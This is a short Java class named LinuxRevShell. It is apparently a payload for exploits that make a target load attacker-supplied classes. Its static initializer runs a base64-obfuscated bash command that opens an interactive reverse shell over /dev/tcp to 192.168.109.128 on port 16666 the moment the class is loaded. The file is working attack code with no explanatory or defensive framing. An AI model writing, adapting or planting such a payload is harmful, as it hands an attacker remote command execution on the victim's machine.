public class LinuxRevShell {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTA5LjEyOC8xNjY2NiAwPiYx}|{base64,-d}|{bash,-i}");
        } catch (Exception e) {
            System.out.println("error!");
        }
    }
}
